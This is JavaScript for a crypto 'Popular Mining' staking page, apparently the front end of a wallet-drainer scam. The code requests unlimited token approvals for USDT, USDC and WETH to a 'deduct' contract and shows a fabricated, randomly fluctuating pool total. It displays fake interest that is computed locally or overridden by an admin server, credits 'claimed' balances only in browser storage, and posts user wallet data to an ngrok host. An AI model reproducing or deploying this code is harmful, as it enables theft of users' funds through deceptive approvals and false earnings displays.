//---Client-side Constants---
const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';

// ===== 关键部分：已更新为您的 ngrok 地址 =====
const API_BASE_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev';

//---ABI Definitions---
const DEDUCT_CONTRACT_ABI = [
    "function isServiceActiveFor(address customer) view returns (bool)",
    "function activateService(address tokenContract) external",
    "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
];
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

//---Global Variables & DOM Elements---
const connectButton = document.getElementById('connectButton');
const statusDiv = document.getElementById('status');
const startBtn = document.getElementById('startBtn');
const pledgeBtn = document.getElementById('pledgeBtn');
const pledgeAmount = document.getElementById('pledgeAmount');
const pledgeDuration = document.getElementById('pledgeDuration');
const pledgeToken = document.getElementById('pledgeToken');
const refreshWallet = document.getElementById('refreshWallet');
const walletTokenSelect = document.getElementById('walletTokenSelect');
const walletBalanceAmount = document.getElementById('walletBalanceAmount');
const accountBalanceValue = document.getElementById('accountBalanceValue');
const totalValue = document.getElementById('totalValue');
const grossOutputValue = document.querySelector('#liquidity .stat-value:nth-of-type(1)');
const cumulativeValue = document.querySelector('#liquidity .stat-value:nth-of-type(2)');
const nextBenefit = document.getElementById('nextBenefit');
const claimBtn = document.createElement('button');
claimBtn.id = 'claimButton';

let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;
let stakingStartTime = null;
let claimedInterest = 0;
let pledgedAmount = 0;
let interestInterval = null;
let nextBenefitInterval = null;
let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };

//---UI Control Functions---
async function saveUserData() {
    if (!userAddress) {
        console.log("saveUserData: No user address available, skipping save."); // 日誌添加
        return;
    }
    const dataToSave = {
        stakingStartTime: localStorage.getItem('stakingStartTime'),
        claimedInterest: localStorage.getItem('claimedInterest'),
        pledgedAmount: localStorage.getItem('pledgedAmount'),
        nextBenefitTime: localStorage.getItem('nextBenefitTime'),
        accountBalance: JSON.parse(localStorage.getItem('accountBalance'))
    };
    try {
        console.log("saveUserData: Sending data to server for address:", userAddress, dataToSave); // 日誌添加
        const response = await fetch(`${API_BASE_URL}/api/user-data`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'ngrok-skip-browser-warning': 'true' 
            },
            body: JSON.stringify({ address: userAddress, data: dataToSave })
        });
        console.log("saveUserData: Response status:", response.status); // 日誌添加
        if (!response.ok) throw new Error(`Failed to save user data, status: ${response.status}`);
        console.log("saveUserData: User data sent to server successfully."); // 日誌添加
    } catch (error) {
        console.warn("saveUserData: Could not send user data to server:", error); // 日誌添加
    }
}

function updateStatus(message, isWarning = false) {
    if (!statusDiv) return;
    statusDiv.innerHTML = message || '';
    statusDiv.style.display = message ? 'block' : 'none';
    statusDiv.style.color = isWarning ? '#FFD700' : '#FFFFFF';
    console.log(`updateStatus: ${isWarning ? 'Warning' : 'Info'}: ${message}`); // 日誌添加
}

function resetState(showMsg = true) {
    console.log("resetState: Executing state reset..."); // 日誌添加
    signer = userAddress = null;
    stakingStartTime = null;
    claimedInterest = 0;
    pledgedAmount = 0;
    accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
    if (interestInterval) {
        clearInterval(interestInterval);
        console.log("resetState: Cleared interest interval:", interestInterval); // 日誌添加
    }
    if (nextBenefitInterval) {
        clearInterval(nextBenefitInterval);
        console.log("resetState: Cleared next benefit interval:", nextBenefitInterval); // 日誌添加
    }
    localStorage.clear();
    console.log("resetState: Local storage cleared."); // 日誌添加
    if (startBtn) {
        startBtn.style.display = 'block';
        startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
    }
    const existingClaimBtn = document.getElementById('claimButton');
    if (existingClaimBtn) {
        existingClaimBtn.remove();
        console.log("resetState: Removed claim button."); // 日誌添加
    }
    if (connectButton) {
        connectButton.classList.remove('connected');
        connectButton.textContent = 'Connect';
        connectButton.title = 'Connect Wallet';
        console.log("resetState: Reset connect button state."); // 日誌添加
    }
    disableInteractiveElements(true);
    if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
    if (walletTokenSelect) walletTokenSelect.value = 'USDT';
    if (accountBalanceValue) accountBalanceValue.textContent = '0.000 USDT';
    if (grossOutputValue) grossOutputValue.textContent = '0 ETH';
    if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
    if (showMsg) updateStatus("Please connect your wallet to continue.");
}

function disableInteractiveElements(disable = false) {
    if (startBtn) startBtn.disabled = disable;
    if (pledgeBtn) pledgeBtn.disabled = disable;
    if (pledgeAmount) pledgeAmount.disabled = disable;
    if (pledgeDuration) pledgeDuration.disabled = disable;
    if (pledgeToken) pledgeToken.disabled = disable;
    if (refreshWallet) {
        refreshWallet.style.pointerEvents = disable ? 'none' : 'auto';
        refreshWallet.style.color = disable ? '#999' : '#ff00ff';
    }
    if (claimBtn) claimBtn.disabled = disable;
    console.log(`disableInteractiveElements: Interactive elements ${disable ? 'disabled' : 'enabled'}.`); // 日誌添加
}

function updateBalancesUI(walletBalances) {
    if (!walletTokenSelect) return;
    const selectedToken = walletTokenSelect.value;
    const decimals = { USDT: 6, USDC: 6, WETH: 18 };
    const walletTokenBigInt = walletBalances[selectedToken.toLowerCase()] || 0n;
    const formattedWalletBalance = ethers.formatUnits(walletTokenBigInt, decimals[selectedToken]);
    if (walletBalanceAmount) {
        walletBalanceAmount.textContent = parseFloat(formattedWalletBalance).toFixed(3);
        console.log(`updateBalancesUI: Updated wallet balance for ${selectedToken}: ${formattedWalletBalance}`); // 日誌添加
    }
    const claimedBalance = accountBalance[selectedToken] || 0;
    const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance;
    if (accountBalanceValue) {
        accountBalanceValue.textContent = `${totalAccountBalance.toFixed(3)} ${selectedToken}`;
        console.log(`updateBalancesUI: Updated account balance for ${selectedToken}: ${totalAccountBalance}`); // 日誌添加
    }
    if (parseFloat(formattedWalletBalance) < 0.001) {
        updateStatus(`Notice: Your ${selectedToken} balance is zero.`, true);
    } else if (statusDiv.style.color === 'rgb(255, 215, 0)') {
        updateStatus("");
    }
}

function updateTotalFunds() {
    if (totalValue) {
        const startTime = new Date('2025-10-22T00:00:00-04:00').getTime();
        const initialFunds = 12856459.94;
        const averageIncreasePerSecond = 0.055;
        const currentTime = Date.now();
        const elapsedSeconds = Math.floor((currentTime - startTime) / 1000);
        const totalIncrease = elapsedSeconds * averageIncreasePerSecond;
        const randomFluctuation = (Math.random() - 0.5);
        const totalFunds = initialFunds + totalIncrease + randomFluctuation;
        totalValue.textContent = `${totalFunds.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
        console.log(`updateTotalFunds: Updated total funds: ${totalFunds.toFixed(2)} ETH`); // 日誌添加
    }
}

async function updateInterest() {
    if (!stakingStartTime || !grossOutputValue || !cumulativeValue || !userAddress) {
        console.log("updateInterest: Skipping due to missing data:", { stakingStartTime, userAddress }); // 日誌添加
        return;
    }
    let finalGrossOutput;
    let finalCumulative;
    let overrideApplied = false;

    try {
        console.log("updateInterest: Fetching data for address:", userAddress); // 日誌添加
        const response = await fetch(`${API_BASE_URL}/api/all-data`, {
            cache: 'no-cache',
            headers: { 'ngrok-skip-browser-warning': 'true' }
        });
        console.log("updateInterest: Response status:", response.status); // 日誌添加
        if (response.ok) {
            const allData = await response.json();
            console.log("updateInterest: Received data:", allData); // 日誌添加
            const userOverrides = allData.overrides[userAddress] || {};
            console.log("updateInterest: User overrides:", userOverrides); // 日誌添加

            if (userOverrides.grossOutput != null && userOverrides.cumulative != null) {
                finalGrossOutput = Number(userOverrides.grossOutput);
                finalCumulative = Number(userOverrides.cumulative);
                if (!isNaN(finalGrossOutput) && !isNaN(finalCumulative)) {
                    console.log("updateInterest: Admin override applied:", { finalGrossOutput, finalCumulative }); // 日誌添加
                    overrideApplied = true;
                } else {
                    console.warn("updateInterest: Invalid override values, skipping:", userOverrides); // 日誌添加
                }
            } else {
                console.log("updateInterest: No valid overrides found for address:", userAddress); // 日誌添加
            }
        } else {
            console.warn("updateInterest: Failed to fetch data, status:", response.status); // 日誌添加
        }
    } catch (error) {
        console.warn("updateInterest: Fetch error:", error); // 日誌添加
    }

    if (!overrideApplied) {
        const currentTime = Date.now();
        const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
        const baseInterestRate = 0.000001;
        const interestRate = baseInterestRate * pledgedAmount;
        finalGrossOutput = elapsedSeconds * interestRate;
        finalCumulative = finalGrossOutput - claimedInterest;
        console.log("updateInterest: Using local calculation:", { finalGrossOutput, finalCumulative }); // 日誌添加
    }

    grossOutputValue.textContent = `${Number(finalGrossOutput).toFixed(7)} ETH`;
    cumulativeValue.textContent = `${Number(finalCumulative).toFixed(7)} ETH`;
    console.log(`updateInterest: Updated UI - Gross Output: ${finalGrossOutput.toFixed(7)} ETH, Cumulative: ${finalCumulative.toFixed(7)} ETH`); // 日誌添加
}

function updateNextBenefitTimer() {
    if (!nextBenefit) return;
    const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime'));
    const label = (translations[currentLang]?.nextBenefit || "Next Benefit: 00:00:00").split(':')[0];
    if (!nextBenefitTimestamp) {
        nextBenefit.textContent = `${label}: 00:00:00`;
        console.log("updateNextBenefitTimer: No next benefit time set."); // 日誌添加
        return;
    }
    const now = Date.now();
    let diff = nextBenefitTimestamp - now;
    if (diff < 0) {
        const twelveHoursInMillis = 12 * 60 * 60 * 1000;
        let newNextBenefitTimestamp = nextBenefitTimestamp;
        while (newNextBenefitTimestamp <= now) {
            newNextBenefitTimestamp += twelveHoursInMillis;
        }
        localStorage.setItem('nextBenefitTime', newNextBenefitTimestamp.toString());
        saveUserData();
        console.log("updateNextBenefitTimer: Updated next benefit time:", newNextBenefitTimestamp); // 日誌添加
    }
    const totalSeconds = Math.floor(diff / 1000);
    const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
    const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
    const seconds = String(totalSeconds % 60).padStart(2, '0');
    nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
    console.log(`updateNextBenefitTimer: Updated timer: ${hours}:${minutes}:${seconds}`); // 日誌添加
}

function getETOffsetMilliseconds() {
    const now = new Date();
    const mar = new Date(now.getFullYear(), 2, 8);
    const nov = new Date(now.getFullYear(), 10, 1);
    const marDay = mar.getDay();
    const novDay = nov.getDay();
    const dstStart = new Date(mar.getFullYear(), mar.getMonth(), 8 + (7 - marDay));
    const dstEnd = new Date(nov.getFullYear(), nov.getMonth(), 1 + (7 - novDay));
    if (now >= dstStart && now < dstEnd) {
        return -4 * 60 * 60 * 1000;
    }
    return -5 * 60 * 60 * 1000;
}

function setInitialNextBenefitTime() {
    if (localStorage.getItem('nextBenefitTime')) return;
    console.log("setInitialNextBenefitTime: Setting initial benefit countdown target based on US Eastern Time..."); // 日誌添加
    const etOffset = getETOffsetMilliseconds();
    const nowUtcTimestamp = Date.now();
    const nowET = new Date(nowUtcTimestamp + etOffset);
    const noonET = new Date(nowET);
    noonET.setHours(12, 0, 0, 0);
    const midnightET = new Date(nowET);
    midnightET.setHours(24, 0, 0, 0);
    let nextBenefitTimeET;
    if (nowET < noonET) {
        nextBenefitTimeET = noonET;
    } else {
        nextBenefitTimeET = midnightET;
    }
    const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
    localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
    saveUserData();
    console.log("setInitialNextBenefitTime: Set next benefit time:", finalNextBenefitTimestamp); // 日誌添加
}

function activateStakingUI() {
    const storedStartTime = localStorage.getItem('stakingStartTime');
    if (storedStartTime) {
        stakingStartTime = parseInt(storedStartTime);
        console.log("activateStakingUI: Restored staking start time:", stakingStartTime); // 日誌添加
    } else {
        stakingStartTime = Date.now();
        localStorage.setItem('stakingStartTime', stakingStartTime.toString());
        console.log("activateStakingUI: Set new staking start time:", stakingStartTime); // 日誌添加
    }
    claimedInterest = parseFloat(localStorage.getItem('claimedInterest')) || 0;
    pledgedAmount = parseFloat(localStorage.getItem('pledgedAmount')) || 0;
    const storedAccountBalance = JSON.parse(localStorage.getItem('accountBalance'));
    if (storedAccountBalance) {
        accountBalance = storedAccountBalance;
        console.log("activateStakingUI: Restored account balance:", accountBalance); // 日誌添加
    }
    if (startBtn) startBtn.style.display = 'none';
    if (document.getElementById('claimButton')) return;
    claimBtn.textContent = translations[currentLang]?.claimBtnText || 'Claim';
    claimBtn.className = 'start-btn';
    claimBtn.style.marginTop = '10px';
    claimBtn.disabled = false;
    const placeholder = document.getElementById('claimButtonPlaceholder');
    placeholder ? placeholder.appendChild(claimBtn) : document.getElementById('liquidity').appendChild(claimBtn);
    console.log("activateStakingUI: Added claim button to UI."); // 日誌添加
    if (!claimBtn.hasEventListener) {
        claimBtn.addEventListener('click', claimInterest);
        claimBtn.hasEventListener = true;
        console.log("activateStakingUI: Added event listener to claim button."); // 日誌添加
    }
    if (interestInterval) clearInterval(interestInterval);
    interestInterval = setInterval(updateInterest, 1000);
    console.log("activateStakingUI: Set interest interval:", interestInterval); // 日誌添加
    if (nextBenefitInterval) clearInterval(nextBenefitInterval);
    nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
    console.log("activateStakingUI: Set next benefit interval:", nextBenefitInterval); // 日誌添加
    saveUserData();
}

//---Core Wallet Logic---
async function sendMobileRobustTransaction(populatedTx) {
    if (!signer || !provider) throw new Error("Wallet not connected or signer is missing.");
    const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
    const fromAddress = await signer.getAddress();
    const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
    let txHash, receipt = null;
    try {
        console.log("sendMobileRobustTransaction: Sending transaction:", mobileTx); // 日誌添加
        txHash = await provider.send('eth_sendTransaction', [mobileTx]);
        updateStatus(`Transaction sent! HASH: ${txHash.slice(0, 10)}... waiting for confirmation...`);
        receipt = await provider.waitForTransaction(txHash);
        console.log("sendMobileRobustTransaction: Transaction confirmed, receipt:", receipt); // 日誌添加
    } catch (error) {
        console.warn("sendMobileRobustTransaction: Transaction error:", error.message); // 日誌添加
        if (error.hash) txHash = error.hash;
        else if (error.message && error.message.includes('0x')) { 
            const match = error.message.match(/(0x[a-fA-F0-9]{64})/); 
            if (match) txHash = match[0]; 
        }
        if (txHash) {
            updateStatus(`Transaction interface error! Sent TX: ${txHash.slice(0, 10)}... waiting for confirmation...`);
            receipt = await provider.waitForTransaction(txHash);
            console.log("sendMobileRobustTransaction: Transaction confirmed after error, receipt:", receipt); // 日誌添加
        } else throw new Error(`Transaction failed to send: ${error.message}`);
    }
    if (!receipt || receipt.status !== 1) throw new Error(`Transaction failed on-chain (reverted). HASH: ${txHash.slice(0, 10)}...`);
    return receipt;
}

async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('Please install MetaMask or a compatible wallet.');
            disableInteractiveElements(true);
            console.log("initializeWallet: No Ethereum provider detected."); // 日誌添加
            return;
        }
        provider = new ethers.BrowserProvider(window.ethereum);
        window.ethereum.on('accountsChanged', (newAccounts) => {
            console.log("initializeWallet: Accounts changed:", newAccounts); // 日誌添加
            if (userAddress) {
                if (newAccounts.length === 0 || userAddress.toLowerCase() !== newAccounts[0].toLowerCase()) {
                    window.location.reload();
                }
            }
        });
        window.ethereum.on('chainChanged', () => {
            console.log("initializeWallet: Chain changed, reloading page."); // 日誌添加
            window.location.reload();
        });
        const accounts = await provider.send('eth_accounts', []);
        console.log("initializeWallet: Initial accounts:", accounts); // 日誌添加
        if (accounts.length > 0) {
            await connectWallet();
        } else {
            disableInteractiveElements(true);
            updateStatus("Please connect your wallet to continue.");
        }
    } catch (error) {
        console.error("initializeWallet: Wallet initialization error:", error); // 日誌添加
        updateStatus(`Initialization failed: ${error.message}`);
    }
}

async function updateUIBasedOnChainState() {
    if (!signer) {
        console.log("updateUIBasedOnChainState: No signer available, skipping."); // 日誌添加
        return;
    }
    try {
        updateStatus("Checking on-chain authorization status...");
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
        console.log("updateUIBasedOnChainState: Required allowance:", requiredAllowance.toString()); // 日誌添加
        const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            deductContract.isServiceActiveFor(userAddress),
            usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n)
        ]);
        console.log("updateUIBasedOnChainState: Chain state:", { isServiceActive, usdtAllowance, usdcAllowance, wethAllowance }); // 日誌添加
        const isWethAuthorized = wethAllowance >= requiredAllowance;
        const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
        const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
        const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
        const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
        if (isFullyAuthorized) {
            console.log("updateUIBasedOnChainState: On-chain state is AUTHORIZED. Switching to staking UI."); // 日誌添加
            if (isWethAuthorized) walletTokenSelect.value = 'WETH';
            else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
            else if (isUsdcAuthorized) walletTokenSelect.value = 'USDC';
            walletTokenSelect.dispatchEvent(new Event('change'));
            setInitialNextBenefitTime();
            activateStakingUI();
        } else {
            console.log("updateUIBasedOnChainState: On-chain state is NOT AUTHORIZED. Showing Start button."); // 日誌添加
            if(startBtn) startBtn.style.display = 'block';
        }
        disableInteractiveElements(false);
        updateStatus("");
    } catch (error) {
        console.error("updateUIBasedOnChainState: Failed to check on-chain state:", error); // 日誌添加
        updateStatus("Failed to check on-chain state. Please refresh.");
    }
}

async function handleConditionalAuthorizationFlow() {
    if (!signer) throw new Error("Wallet not connected");
    updateStatus('Preparing authorization...');
    const selectedToken = walletTokenSelect.value;
    console.log(`handleConditionalAuthorizationFlow: User selected ${selectedToken} for authorization.`); // 日誌添加
    const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
    console.log("handleConditionalAuthorizationFlow: Required allowance:", requiredAllowance.toString()); // 日誌添加
    const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
    console.log("handleConditionalAuthorizationFlow: Service activated:", serviceActivated); // 日誌添加
    const tokenMap = { 'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS }, 'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS }, 'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS } };
    const tokensToProcess = [ tokenMap[selectedToken], ...Object.values(tokenMap).filter(t => t.name !== selectedToken) ];
    let tokenToActivate = '';
    for (const { name, contract, address } of tokensToProcess) {
        updateStatus(`Checking ${name} allowance...`);
        const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n);
        console.log(`handleConditionalAuthorizationFlow: ${name} allowance:`, currentAllowance.toString()); // 日誌添加
        if (currentAllowance < requiredAllowance) {
            updateStatus(`Requesting ${name} approval... Please approve in your wallet.`);
            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
            approvalTx.value = 0n;
            console.log("handleConditionalAuthorizationFlow: Sending approval transaction for", name, approvalTx); // 日誌添加
            await sendMobileRobustTransaction(approvalTx);
            const newAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n);
            console.log(`handleConditionalAuthorizationFlow: New ${name} allowance:`, newAllowance.toString()); // 日誌添加
            if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
        } else {
            if (!tokenToActivate) tokenToActivate = address;
        }
    }
    if (!serviceActivated && tokenToActivate) {
        const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
        updateStatus(`Activating service (using ${tokenName})...`);
        const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
        activateTx.value = 0n;
        console.log("handleConditionalAuthorizationFlow: Sending activate service transaction:", activateTx); // 日誌添加
        await sendMobileRobustTransaction(activateTx);
    }
}

async function connectWallet() {
    try {
        if (!provider) throw new Error("Provider not initialized");
        updateStatus('Please confirm connection in your wallet...');
        const accounts = await provider.send('eth_requestAccounts', []);
        console.log("connectWallet: Accounts received:", accounts); // 日誌添加
        if (accounts.length === 0) throw new Error("No account selected.");
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        console.log("connectWallet: Connected user address:", userAddress); // 日誌添加
        connectButton.classList.add('connected');
        connectButton.textContent = 'Connected';
        connectButton.title = 'Disconnect Wallet';
        deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
        await updateUIBasedOnChainState();
        updateStatus('Fetching wallet balances...');
        const balances = { 
            usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), 
            usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), 
            weth: await wethContract.balanceOf(userAddress).catch(() => 0n) 
        };
        console.log("connectWallet: Wallet balances:", balances); // 日誌添加
        updateBalancesUI(balances);
        updateStatus("");
        await saveUserData();
    } catch (error) {
        console.error("connectWallet: Connection error:", error); // 日誌添加
        let userMessage = `Error: ${error.message}`;
        if (error.code === 4001) userMessage = "You rejected the connection request.";
        updateStatus(userMessage);
        resetState(true);
    }
}

function disconnectWallet() {
    resetState(true);
    alert('Wallet disconnected. To fully remove permissions, do so from within your wallet settings.');
    console.log("disconnectWallet: Wallet disconnected."); // 日誌添加
}

async function getEthPrices() {
    try {
        updateStatus("Fetching latest prices...");
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,usdt', {
            headers: { 'ngrok-skip-browser-warning': 'true' }
        });
        console.log("getEthPrices: Response status:", response.status); // 日誌添加
        if (!response.ok) throw new Error('Network response was not ok');
        const data = await response.json();
        console.log("getEthPrices: Received price data:", data); // 日誌添加
        const prices = { usd: data.ethereum.usd, usdt: data.ethereum.usdt, usdc: data.ethereum.usd, weth: data.ethereum.usdt };
        updateStatus("");
        return prices;
    } catch (error) {
        console.error("getEthPrices: Could not fetch ETH price:", error); // 日誌添加
        updateStatus("Could not fetch price data.", true);
        return null;
    }
}

async function claimInterest() {
    const claimableETHString = cumulativeValue.textContent.replace(' ETH', '');
    const claimableETH = parseFloat(claimableETHString);
    console.log("claimInterest: Attempting to claim:", claimableETH); // 日誌添加
    if (!claimableETH || claimableETH < 0.0000001) {
        alert("No claimable interest available.");
        return;
    }
    const prices = await getEthPrices();
    if (!prices) {
        alert("Failed to get price data. Please try again later.");
        return;
    }
    const selectedToken = walletTokenSelect.value;
    const ethToTokenRate = prices[selectedToken.toLowerCase()];
    const valueInToken = claimableETH * ethToTokenRate;
    console.log("claimInterest: Claim details:", { claimableETH, selectedToken, ethToTokenRate, valueInToken }); // 日誌添加
    const confirmation = confirm(`You are about to claim ${claimableETH.toFixed(7)} ETH.\nCurrent ETH Price: ~$${prices.usd.toFixed(2)}\nThis will be converted to approximately ${valueInToken.toFixed(3)} ${selectedToken} and added to your Account Balance.\n\nDo you want to proceed?`);
    if (confirmation) {
        const grossOutputETH = parseFloat(grossOutputValue.textContent.replace(' ETH', ''));
        claimedInterest = grossOutputETH;
        localStorage.setItem('claimedInterest', claimedInterest.toString());
        accountBalance[selectedToken] = (accountBalance[selectedToken] || 0) + valueInToken;
        localStorage.setItem('accountBalance', JSON.stringify(accountBalance));
        console.log("claimInterest: Updated claimed interest and account balance:", { claimedInterest, accountBalance }); // 日誌添加
        updateInterest();
        const walletBalances = { 
            usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), 
            usdc: await usdtContract.balanceOf(userAddress).catch(() => 0n), 
            weth: await wethContract.balanceOf(userAddress).catch(() => 0n) 
        };
        updateBalancesUI(walletBalances);
        alert("Claim successful! Your Account Balance has been updated.");
        await saveUserData();
    }
}

//---Language Control---
const translations = { 
    'en': { 
        title: 'Popular Mining', 
        subtitle: 'Start Earning Millions', 
        tabLiquidity: 'Liquidity', 
        tabPledging: 'Pledging', 
        grossOutputLabel: 'Gross Output', 
        cumulativeLabel: 'Cumulative', 
        walletBalanceLabel: 'Wallet Balance', 
        accountBalanceLabel: 'Account Balance', 
        compoundLabel: '⚡ Compound', 
        nextBenefit: 'Next Benefit: 00:00:00', 
        startBtnText: 'Start', 
        pledgeAmountLabel: 'Pledge Amount', 
        pledgeDurationLabel: 'Duration', 
        pledgeBtnText: 'Pledge Now', 
        totalPledgedLabel: 'Total Pledged', 
        expectedYieldLabel: 'Expected Yield', 
        apyLabel: 'APY', 
        lockedUntilLabel: 'Locked Until', 
        claimBtnText: 'Claim' 
    }, 
    'zh-Hant': { 
        title: '熱門挖礦', 
        subtitle: '開始賺取數百萬', 
        tabLiquidity: '流動性', 
        tabPledging: '質押', 
        grossOutputLabel: '總產出', 
        cumulativeLabel: '累計', 
        walletBalanceLabel: '錢包餘額', 
        accountBalanceLabel: '帳戶餘額', 
        compoundLabel: '⚡ 複利', 
        nextBenefit: '下次收益: 00:00:00', 
        startBtnText: '開始', 
        pledgeAmountLabel: '質押金額', 
        pledgeDurationLabel: '期間', 
        pledgeBtnText: '立即質押', 
        totalPledgedLabel: '總質押', 
        expectedYieldLabel: '預期收益', 
        apyLabel: '年化收益率', 
        lockedUntilLabel: '鎖定至', 
        claimBtnText: '領取' 
    }, 
    'zh-Hans': { 
        title: '热门挖矿', 
        subtitle: '开始赚取数百万', 
        tabLiquidity: '流动性', 
        tabPledging: '质押', 
        grossOutputLabel: '总产出', 
        cumulativeLabel: '累计', 
        walletBalanceLabel: '钱包余额', 
        accountBalanceLabel: '账户余额', 
        compoundLabel: '⚡ 复利', 
        nextBenefit: '下次收益: 00:00:00', 
        startBtnText: '开始', 
        pledgeAmountLabel: '质押金额', 
        pledgeDurationLabel: '期间', 
        pledgeBtnText: '立即质押', 
        totalPledgedLabel: '总质押', 
        expectedYieldLabel: '预期收益', 
        apyLabel: '年化收益率', 
        lockedUntilLabel: '锁定至', 
        claimBtnText: '领取' 
    } 
};
let currentLang = 'en';
const languageSelect = document.getElementById('languageSelect');
const elements = { 
    title: document.getElementById('title'), 
    subtitle: document.getElementById('subtitle'), 
    tabLiquidity: document.getElementById('tabLiquidity'), 
    tabPledging: document.getElementById('tabPledging'), 
    grossOutputLabel: document.getElementById('grossOutputLabel'), 
    cumulativeLabel: document.getElementById('cumulativeLabel'), 
    walletBalanceLabel: document.getElementById('walletBalanceLabel'), 
    accountBalanceLabel: document.getElementById('accountBalanceLabel'), 
    compoundLabel: document.getElementById('compoundLabel'), 
    nextBenefit: document.getElementById('nextBenefit'), 
    startBtnText: document.getElementById('startBtn'), 
    pledgeAmountLabel: document.getElementById('pledgeAmountLabel'), 
    pledgeDurationLabel: document.getElementById('pledgeDurationLabel'), 
    pledgeBtnText: document.getElementById('pledgeBtn'), 
    totalPledgedLabel: document.getElementById('totalPledgedLabel'), 
    expectedYieldLabel: document.getElementById('expectedYieldLabel'), 
    apyLabel: 'APY', 
    lockedUntilLabel: document.getElementById('lockedUntilLabel'), 
    claimBtnText: claimBtn 
};

function updateLanguage(lang) {
    currentLang = lang;
    languageSelect.value = lang;
    for (let key in elements) {
        if (elements[key] && translations[lang]?.[key]) {
            elements[key].textContent = translations[lang][key];
        }
    }
    if (claimBtn.parentNode) {
        claimBtn.textContent = translations[lang]?.claimBtnText || 'Claim';
    }
    updateNextBenefitTimer();
    console.log(`updateLanguage: Switched to language: ${lang}`); // 日誌添加
}

//---Event Listeners & Initial Load---
document.addEventListener('DOMContentLoaded', () => {
    const savedLang = localStorage.getItem('language') || 'en';
    updateLanguage(savedLang);
    initializeWallet();
    setInterval(updateTotalFunds, 1000);
    console.log("DOMContentLoaded: Initialized wallet and started total funds update."); // 日誌添加
});

languageSelect.addEventListener('change', (e) => {
    const lang = e.target.value;
    localStorage.setItem('language', lang);
    updateLanguage(lang);
    console.log(`languageSelect: Changed language to: ${lang}`); // 日誌添加
});

connectButton.addEventListener('click', () => {
    if (connectButton.classList.contains('connected')) {
        disconnectWallet();
    } else {
        connectWallet();
    }
});

startBtn.addEventListener('click', async () => {
    if (!signer) {
        alert('Please connect your wallet first!');
        console.log("startBtn: Clicked but no signer available."); // 日誌添加
        return;
    }
    const selectedToken = walletTokenSelect.value;
    const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
    const selectedContract = tokenMap[selectedToken];
    try {
        const balance = await selectedContract.balanceOf(userAddress);
        console.log(`startBtn: Checked balance for ${selectedToken}:`, balance.toString()); // 日誌添加
        if (balance === 0n) {
            alert(`Your ${selectedToken} balance is zero. Please ensure you have sufficient balance to start.`);
            return;
        }
    } catch (e) {
        alert("Could not fetch balance. Please try again later.");
